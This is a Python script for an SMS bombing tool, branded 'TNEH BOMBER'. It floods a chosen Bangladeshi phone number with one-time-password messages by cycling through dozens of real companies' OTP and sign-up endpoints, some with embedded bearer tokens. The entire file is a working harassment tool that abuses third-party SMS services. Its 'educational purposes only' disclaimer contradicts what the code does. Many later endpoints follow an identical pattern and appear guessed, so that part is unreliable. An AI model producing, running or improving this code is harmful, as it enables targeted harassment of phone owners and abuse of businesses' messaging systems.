import os
import sys
import time
import json
import random
import requests
import threading
from datetime import datetime

# Color codes for terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Animated Banner with Female Anime Character
def print_animated_banner():
    os.system('clear')

    # Animation frames for the banner
    frames = [
        f"""
{Colors.RED}{Colors.BOLD}
  ╔══════════════════════════════════╗
  ║        TNEH BOMBER TOOL         ║
  ║    🎀 𝓕𝓮𝓶𝓪𝓵𝓮 𝓐𝓷𝓲𝓶𝓮 𝓔𝓭𝓲𝓽𝓲𝓸𝓷 🎀   ║
  ╚══════════════════════════════════╚
        \\   ^__^
         \\  (oo)\\_______
            (__)\\       )\\/\\
                ||----w |
                ||     ||
{Colors.RESET}""",
        f"""
{Colors.MAGENTA}{Colors.BOLD}
  ╔══════════════════════════════════╗
  ║        TNEH BOMBER TOOL         ║
  ║    🎀 𝓕𝓮𝓶𝓪𝓵𝓮 𝓐𝓷𝓲𝓶𝓮 𝓔𝓭𝓲𝓽𝓲𝓸𝓷 🎀   ║
  ╚══════════════════════════════════╚
        \\   ^__^
         \\  (oo)\\_______
            (__)\\       )\\/\\
                ||----w |
                ||     ||
{Colors.RESET}""",
        f"""
{Colors.CYAN}{Colors.BOLD}
  ╔══════════════════════════════════╗
  ║        TNEH BOMBER TOOL         ║
  ║    🎀 𝓕𝓮𝓶𝓪𝓵𝓮 𝓐𝓷𝓲𝓶𝓮 𝓔𝓭𝓲𝓽𝓲𝓸𝓷 🎀   ║
  ╚══════════════════════════════════╚
        \\   ^__^
         \\  (oo)\\_______
            (__)\\       )\\/\\
                ||----w |
                ||     ||
{Colors.RESET}"""
    ]

    # Display animation
    for frame in frames:
        os.system('clear')
        print(frame)
        time.sleep(0.3)

    # Final static banner
    final_banner = f"""
{Colors.RED}{Colors.BOLD}
████████╗███╗   ██╗███████╗██╗  ██╗
╚══██╔══╝████╗  ██║██╔════╝██║  ██║
   ██║   ██╔██╗ ██║█████╗  ███████║
   ██║   ██║╚██╗██║██╔══╝  ██╔══██║
   ██║   ██║ ╚████║███████╗██║  ██║
   ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.MAGENTA}✧･ﾟ: *✧･ﾟ:* 𝓕𝓮𝓶𝓪𝓵𝓮 𝓐𝓷𝓲𝓶𝓮 𝓔𝓭𝓲𝓽𝓲𝓸𝓷 *:･ﾟ✧*:･ﾟ✧{Colors.RESET}

{Colors.CYAN}    ╔══════════════════════════╗
    ║       🎀 TNEH BOMBER 🎀     ║
    ║    Developer: Noman         ║
    ║  Telegram: @Noman301523     ║
    ╚══════════════════════════╝{Colors.RESET}

{Colors.YELLOW}        ♡(>ᴗ•) ~ 𝓐𝓷𝓲𝓶𝓮 𝓖𝓲𝓻𝓵 𝓟𝓸𝔀𝓮𝓻! ♡
         /﹋﹋﹋﹋\\
        ︴・ᴗ・ ︴
         \\______/{Colors.RESET}
"""
    print(final_banner)

# Simple banner without animation (for quick display)
def print_banner():
    os.system('clear')
    banner = f"""
{Colors.RED}{Colors.BOLD}
████████╗███╗   ██╗███████╗██╗  ██╗
╚══██╔══╝████╗  ██║██╔════╝██║  ██║
   ██║   ██╔██╗ ██║█████╗  ███████║
   ██║   ██║╚██╗██║██╔══╝  ██╔══██║
   ██║   ██║ ╚████║███████╗██║  ██║
   ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.MAGENTA}🎀 𝓕𝓮𝓶𝓪𝓵𝓮 𝓐𝓷𝓲𝓶𝓮 𝓔𝓭𝓲𝓽𝓲𝓸𝓷 🎀{Colors.RESET}

{Colors.CYAN}┌─────────────────────────────────────┐
│           TNEH BOMBER TOOL          │
│        Developer: Noman             │
│      Telegram: @Noman301523         │
└─────────────────────────────────────┘{Colors.RESET}

{Colors.YELLOW}       ♡(>ᴗ•) ~ 𝓐𝓷𝓲𝓶𝓮 𝓖𝓲𝓻𝓵 𝓟𝓸𝔀𝓮𝓻! ♡
        /﹋﹋﹋﹋\\
       ︴・ᴗ・ ︴
        \\______/{Colors.RESET}
"""
    print(banner)

# API configurations - COMPLETE LIST (HIDDEN FROM USER)
def get_apis(mobile):
    return [
        # Fast APIs
        {
            "url": f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=880{mobile[1:]}&lang=en&ng=0",
            "method": "get",
            "headers": {}
        },
        {
            "url": f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={mobile}",
            "method": "get",
            "headers": {}
        },

        # New APIs from the list
        {
            "url": f"https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={mobile}&country_code=+880&fcm_token=null",
            "method": "post",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no={mobile}&email=xbomber_public%40gmail.com&verification_type=registration",
            "method": "get",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "http://27.131.15.19/lstyle/api/lsotprequest",
            "method": "post",
            "body": json.dumps({"shortcode": "2494905", "msisdn": f"88{mobile}"}),
            "headers": {"content-type": "application/json", "content-length": "48"}
        },
        {
            "url": f"http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-{mobile}/operator-All/send",
            "method": "get",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
            "method": "post",
            "body": json.dumps({
                "AccessToken": "",
                "TrackingNo": "",
                "mobileNo": mobile,
                "otpSms": "",
                "product_id": "250",
                "requestChannel": "MOB",
                "trackingStatus": 5
            }),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88{mobile}",
            "method": "post",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"http://45.114.85.19:8080/v3/otp/send?msisdn=88{mobile}",
            "method": "get",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"http://apibeta.iqra-live.com/api/v2/sent-otp/{mobile}",
            "method": "get",
            "headers": {"x-user-channel": "apps"}
        },
        {
            "url": "https://shop.shajgoj.com/wp-admin/admin-ajax.php",
            "method": "post",
            "body": f"action=xoo_ml_login_with_otp&xoo-ml-phone-login={mobile}&xoo-ml-form-token=4840&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://api.eat-z.com/auth/customer/signin",
            "method": "post",
            "body": json.dumps({"username": f"+88{mobile}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://aleshacard.com/api/register-otp?contact_no={mobile}",
            "method": "post",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://themallbd.com/api/auth/otp_login",
            "method": "post",
            "body": json.dumps({"phone_number": f"+88{mobile}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://win.fundesh.com.bd/authSrv/auth/generateOtp",
            "method": "post",
            "body": json.dumps({"msisdn": mobile, "clientId": "d2c_client"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88{mobile}",
            "method": "post",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3",
            "method": "post",
            "body": json.dumps({"mobileNumber": f"88{mobile}", "countryId": 22}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null",
            "method": "post",
            "body": json.dumps({"CustomerId": "01833268701", "MobileOrEmail": mobile, "Type": 2}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0",
            "method": "post",
            "body": f"mobile=+88{mobile}&fcmToken=&referral=",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api-2.osudpotro.com/api/v1/users/send_otp",
            "method": "post",
            "body": json.dumps({"mobile": f"+88-{mobile}", "deviceToken": "web", "language": "en", "os": "web"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://shop.shajgoj.com/wp-admin/admin-ajax.php",
            "method": "post",
            "body": f"action=xoo_ml_login_with_otp&xoo-ml-phone-login={mobile}&xoo-ml-form-token=3563&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F%3Ffbclid%3DIwAR2mUXNZgDYWrrONUqp61_3Ac4vtnaZUUcBUVwFVTjqgymp5x_2i0nULH_k",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "http://nesco.sslwireless.com/api/v1/login",
            "method": "post",
            "body": f"phone_number={mobile}",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://webapi.robi.com.bd/v1/send-otp",
            "method": "post",
            "body": json.dumps({"phone_number": mobile}),
            "headers": {
                "content-type": "application/json",
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1Mjk2MTAyOSwiZXhwIjoxNjUzMDQ3NDI5LCJuYmYiOjE2NTI5NjEwMjksImp0aSI6IjBXSW9ld0U3bzFJRVNHTVUiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.lxP2K3WU36mO8By_dNiVO3VYOSajRofD-Rhqb-0y8ok"
            }
        },
        {
            "url": "https://shop.shajgoj.com/wp-admin/admin-ajax.php",
            "method": "post",
            "body": f"action=xoo_ml_login_with_otp&xoo-ml-phone-login={mobile}&xoo-ml-form-token=3490&xoo-ml-form-type=login_user_with_otp&redirect=%252Fmy-account%252F&=",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://api.bongo-solutions.com/auth/api/login/send-otp",
            "method": "post",
            "body": json.dumps({"operator": "all", "msisdn": f"88{mobile}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{mobile}",
            "method": "post",
            "headers": {
                "content-type": "application/json",
                "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"
            }
        },
        {
            "url": "https://edge.ali2bd.com/api/consumer/v1/auth/login",
            "method": "post",
            "body": json.dumps({"username": f"+88{mobile}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://www.sineorbiz.com/wp-content/plugins/bkash.php?phone={mobile}",
            "method": "get",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
            "method": "post",
            "body": json.dumps({"mobile": mobile}),
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://api.osudpotro.com/api/v1/users/send_otp",
            "method": "post",
            "body": json.dumps({"mobile": f"+88{mobile}", "deviceToken": "web", "language": "en", "os": "web"}),
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://api.shopoth.com/shop/api/v1/otps/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
            "method": "post",
            "body": json.dumps({
                "requestType": "send",
                "phoneNumber": f"+88{mobile}",
                "emailConsent": True,
                "whatsappConsent": True
            }),
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
            "method": "post",
            "body": json.dumps({
                "full_name": "TNEH",
                "company_name": "Bomber",
                "email_address": "tneh@gmail.com",
                "phone_number": mobile
            }),
            "headers": {"content-type": "application/json"}
        },
        # Original APIs
        {
            "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
            "method": "post",
            "body": json.dumps({"msisdn": f"880{mobile[1:]}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.osudpotro.com/api/v1/users/send_otp",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.apex4u.com/api/auth/login",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://bb-api.bohubrihi.com/public/activity/otp",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        # Additional New APIs
        {
            "url": "https://api.priyoshop.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.dhakai.com/api/v2/login",
            "method": "post",
            "body": json.dumps({"phone": f"+88{mobile}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.othoba.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://api.patron.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.shohoz.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://api.foodpanda.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.pathao.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.daraz.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.chaldal.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://api.pickaboo.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.evaly.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.deshifood.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://api.bikroy.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.cellbazaar.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://api.robi.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.airtel.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://api.banglalink.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.teletalk.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://api.gp.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.bl.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        # More Bangladeshi APIs
        {
            "url": "https://api.shohoz.com/api/v1/user/send-otp",
            "method": "post",
            "body": json.dumps({"mobile": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.uber.com/api/v1/send-otp",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.bdapps.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.nagad.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.bkash.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.rocket.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.upay.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.mcash.com.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.sslwireless.com/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.basis.org.bd/api/v1/otp/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
    ]

# Global variables
bombing_active = False
messages_sent = 0
success_count = 0
fail_count = 0
total_apis = 0

def show_loading_animation(message, duration=2):
    """Show loading animation with cute anime style"""
    animation_frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    start_time = time.time()
    frame_index = 0

    print(f"\n{Colors.MAGENTA}🎀 {message}{Colors.RESET}")

    while time.time() - start_time < duration:
        frame = animation_frames[frame_index % len(animation_frames)]
        print(f"{Colors.CYAN}\r  {frame} Loading... {frame}{Colors.RESET}", end="", flush=True)
        frame_index += 1
        time.sleep(0.1)

    print(f"{Colors.GREEN}\r  ✅ Ready! {Colors.RESET}")

def send_sms(api, mobile):
    """Send SMS using API"""
    try:
        if api["method"].lower() == "get":
            response = requests.get(api["url"], headers=api.get("headers", {}), timeout=10)
        else:
            body = api.get("body", "")
            if isinstance(body, dict):
                body = json.dumps(body)
            response = requests.post(api["url"], data=body, headers=api.get("headers", {}), timeout=10)

        if response.status_code in [200, 201, 202]:
            return True
        return False
    except:
        return False

def bombing_thread(mobile, count):
    """Main bombing thread - EXACT COUNT VERSION"""
    global bombing_active, messages_sent, success_count, fail_count

    apis = get_apis(mobile)
    total_apis = len(apis)

    # Show cute starting animation
    print(f"\n{Colors.MAGENTA}🎀 Starting TNEH Anime Bombing...{Colors.RESET}")
    show_loading_animation("Initializing cute attack mode", 1)

    print(f"{Colors.CYAN}[🎯] Target: {mobile}{Colors.RESET}")
    print(f"{Colors.CYAN}[📱] Total APIs: {total_apis}{Colors.RESET}")
    print(f"{Colors.CYAN}[💌] Requested SMS: {count}{Colors.RESET}")
    print(f"{Colors.YELLOW}[⚠️] Press Ctrl+C to stop{Colors.RESET}\n")

    start_time = time.time()

    # Shuffle APIs for random order
    random.shuffle(apis)

    # Use API index to track position
    api_index = 0

    # Cute anime expressions for different progress levels
    anime_expressions = ["(>ᴗ•)♡", "(´｡• ᵕ •｡`)", "( ˘ ³˘)♥", "(◕‿◕✿)", "（*´▽｀*）"]

    # Initialize counters
    success_count = 0
    fail_count = 0

    while bombing_active and messages_sent < count:
        if api_index >= len(apis):
            # If we've used all APIs, reshuffle and start from beginning
            random.shuffle(apis)
            api_index = 0

        api = apis[api_index]
        api_index += 1

        expression = anime_expressions[messages_sent % len(anime_expressions)]

        if send_sms(api, mobile):
            messages_sent += 1
            success_count += 1
            print(f"{Colors.GREEN}[💖] SMS #{messages_sent} {expression} Sent successfully!{Colors.RESET}")
        else:
            fail_count += 1
            # Don't show failed API URLs, just count them
            if fail_count % 5 == 0:  # Show fail count every 5 failures
                print(f"{Colors.RED}[💔] Failed attempts: {fail_count}{Colors.RESET}")

        # Small delay between requests
        time.sleep(0.3)

        # Progress update every 5 SMS or when near completion with cute anime
        if messages_sent % 5 == 0 or messages_sent == count:
            elapsed_time = time.time() - start_time
            rate = messages_sent / elapsed_time if elapsed_time > 0 else 0
            remaining = count - messages_sent

            # Different anime faces based on progress
            if remaining > count * 0.7:
                face = "( •̀ ω •́ )✧"
            elif remaining > count * 0.3:
                face = "(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧"
            else:
                face = "╰(⸝⸝⸝´꒳`⸝⸝⸝)╯"

            print(f"{Colors.MAGENTA}[📊] {face} Progress: {messages_sent}/{count} | Remaining: {remaining} | Rate: {rate:.1f} SMS/sec{Colors.RESET}")
            if fail_count > 0:
                print(f"{Colors.YELLOW}[📊] Success: {success_count} | Failed: {fail_count}{Colors.RESET}")

    bombing_active = False
    total_time = time.time() - start_time

    # Completion animation
    print(f"\n{Colors.GREEN}{Colors.BOLD}🎉✨ TNEH Anime Bombing Completed! ✨🎉{Colors.RESET}")
    print(f"{Colors.CYAN}[💌] Total SMS Sent: {messages_sent}{Colors.RESET}")
    print(f"{Colors.CYAN}[⏰] Total Time: {total_time:.1f} seconds{Colors.RESET}")
    if total_time > 0:
        print(f"{Colors.CYAN}[⚡] Average Rate: {messages_sent/total_time:.1f} SMS/sec{Colors.RESET}")

    # Show success/failure summary
    print(f"{Colors.GREEN}[✅] Successful: {success_count}{Colors.RESET}")
    print(f"{Colors.RED}[❌] Failed: {fail_count}{Colors.RESET}")

    # Victory anime expression
    victory_faces = ["(ﾉ≧∀≦)ﾉ ‥…━━━★", "♪ヽ(･ˇ∀ˇ･ゞ)", "✧⁺⸜(●′▾‵●)⸝⁺✧"]
    victory_face = random.choice(victory_faces)

    # Verify exact count
    if messages_sent == count:
        print(f"{Colors.GREEN}[✅] {victory_face} Exact count achieved: {messages_sent} SMS sent!{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}[⚠️] Partial completion: {messages_sent}/{count} SMS sent{Colors.RESET}")

def start_bombing():
    """Start SMS bombing process"""
    global bombing_active, messages_sent, success_count, fail_count

    print_banner()

    try:
        # Get target number with cute prompt
        mobile = input(f"{Colors.YELLOW}[?] {Colors.MAGENTA}♡ Enter Bangladeshi number (01XXXXXXXXX): {Colors.RESET}").strip()

        if not (mobile.startswith("01") and len(mobile) == 11 and mobile.isdigit()):
            print(f"{Colors.RED}[💔] Invalid number format!{Colors.RESET}")
            input(f"{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")
            return

        # Get SMS count
        try:
            count = int(input(f"{Colors.YELLOW}[?] {Colors.MAGENTA}💌 Enter number of SMS to send: {Colors.RESET}").strip())
            if count <= 0:
                print(f"{Colors.RED}[💔] Please enter a positive number!{Colors.RESET}")
                input(f"{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")
                return
        except ValueError:
            print(f"{Colors.RED}[💔] Invalid number!{Colors.RESET}")
            input(f"{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")
            return

        # Confirm bombing with anime style warning
        print(f"\n{Colors.RED}{Colors.BOLD}🚨 WARNING: This will send EXACTLY {count} SMS to {mobile}{Colors.RESET}")
        print(f"{Colors.YELLOW}💫 Anime Power Activated! Ready for cute attack? {Colors.RESET}")
        confirm = input(f"{Colors.YELLOW}[?] {Colors.MAGENTA}🎀 Confirm? (y/N): {Colors.RESET}").strip().lower()

        if confirm != 'y':
            print(f"{Colors.YELLOW}[💫] Operation cancelled.{Colors.RESET}")
            input(f"{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")
            return

        # Start bombing
        bombing_active = True
        messages_sent = 0
        success_count = 0
        fail_count = 0

        # Start bombing in separate thread
        thread = threading.Thread(target=bombing_thread, args=(mobile, count))
        thread.daemon = True
        thread.start()

        # Wait for completion or user interrupt
        try:
            while bombing_active and thread.is_alive():
                time.sleep(1)
        except KeyboardInterrupt:
            bombing_active = False
            print(f"\n{Colors.YELLOW}[💫] Stopping bombing...{Colors.RESET}")
            thread.join(timeout=5)

        input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

    except KeyboardInterrupt:
        bombing_active = False
        print(f"\n{Colors.YELLOW}[💫] Operation cancelled by user.{Colors.RESET}")
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

def about_tool():
    """Show about information with anime style"""
    print_banner()
    about_text = f"""
{Colors.MAGENTA}{Colors.BOLD}🎀 TNEH BOMBER TOOL - Anime Edition{Colors.RESET}

{Colors.GREEN}✨ Features:{Colors.RESET}
• 100+ Working Bangladeshi APIs
• EXACT SMS Count - No Over-sending
• Multi-threaded bombing
• Real-time progress tracking
• No external dependencies
• {Colors.MAGENTA}Kawaii Anime Interface{Colors.RESET}
• {Colors.CYAN}Private API URLs{Colors.RESET}

{Colors.YELLOW}⚡ How to Use:{Colors.RESET}
1. Select option 1 from main menu
2. Enter target number (01XXXXXXXXX)
3. Enter number of SMS to send
4. Confirm and wait for results

{Colors.GREEN}🎯 Precision Control:{Colors.RESET}
• Sends EXACTLY the number of SMS you request
• No extra messages will be sent
• Real-time progress tracking

{Colors.CYAN}🔒 Privacy Features:{Colors.RESET}
• API URLs are hidden for security
• Only success/failure counts shown
• Clean and professional output

{Colors.CYAN}💫 Anime Power:{Colors.RESET}
• Cute loading animations
• Kawaii progress indicators
• Female anime character theme
• Expressional feedback system

{Colors.RED}⚠️  Disclaimer:{Colors.RESET}
This tool is for educational purposes only.
Misuse of this tool is strictly prohibited.
The developer is not responsible for any misuse.

{Colors.MAGENTA}👨‍💻 Developer: Noman{Colors.RESET}
{Colors.BLUE}📧 Telegram: @Noman301523{Colors.RESET}

{Colors.GREEN}🔒 Private Tool - Do Not Share{Colors.RESET}

{Colors.YELLOW}       ♡(>ᴗ•) ~ 𝓐𝓷𝓲𝓶𝓮 𝓖𝓲𝓻𝓵 𝓟𝓸𝔀𝓮𝓻! ♡
        /﹋﹋﹋﹋\\
       ︴・ᴗ・ ︴
        \\______/{Colors.RESET}
"""
    print(about_text)
    input(f"{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

def main_menu():
    """Main menu with anime style"""
    while True:
        print_banner()

        menu = f"""
{Colors.MAGENTA}╔══════════════════════════════════╗
║          🎀 MAIN MENU 🎀          ║
╠══════════════════════════════════╣
║ {Colors.GREEN}1{Colors.MAGENTA}. {Colors.CYAN}Start TNEH Anime Bombing{Colors.MAGENTA}   ║
║ {Colors.GREEN}2{Colors.MAGENTA}. {Colors.CYAN}About Tool{Colors.MAGENTA}                 ║
║ {Colors.RED}0{Colors.MAGENTA}. {Colors.CYAN}Exit{Colors.MAGENTA}                        ║
╚══════════════════════════════════╝
{Colors.RESET}"""
        print(menu)

        choice = input(f"{Colors.YELLOW}[?] {Colors.MAGENTA}🎀 Select option: {Colors.RESET}").strip()

        if choice == '1':
            start_bombing()
        elif choice == '2':
            about_tool()
        elif choice == '0':
            print(f"\n{Colors.GREEN}[💫] Thank you for using TNEH Anime Bomber!{Colors.RESET}")
            print(f"{Colors.CYAN}[👋] Developer: Noman | Telegram: @Noman301523{Colors.RESET}")
            print(f"{Colors.MAGENTA}[🎀] Sayonara! (•ᴗ•)ﾉ゛{Colors.RESET}\n")
            break
        else:
            print(f"{Colors.RED}[💔] Invalid option!{Colors.RESET}")
            time.sleep(1)

def check_dependencies():
    """Check if required packages are installed"""
    try:
        import requests
        print(f"{Colors.GREEN}[✅] requests module is installed{Colors.RESET}")
    except ImportError:
        print(f"{Colors.RED}[💔] requests module not found!{Colors.RESET}")
        print(f"{Colors.YELLOW}[💫] Install it using: pip install requests{Colors.RESET}")
        return False
    return True

if __name__ == "__main__":
    try:
        # Show animated banner on startup
        print_animated_banner()
        time.sleep(1)

        # Check dependencies
        if not check_dependencies():
            print(f"{Colors.RED}[💔] Please install required dependencies first!{Colors.RESET}")
            sys.exit(1)

        # Start main menu
        main_menu()

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[💫] Tool stopped by user.{Colors.RESET}")
        print(f"{Colors.GREEN}[👋] Thank you for using TNEH Anime Bomber!{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[💔] An error occurred: {e}{Colors.RESET}")
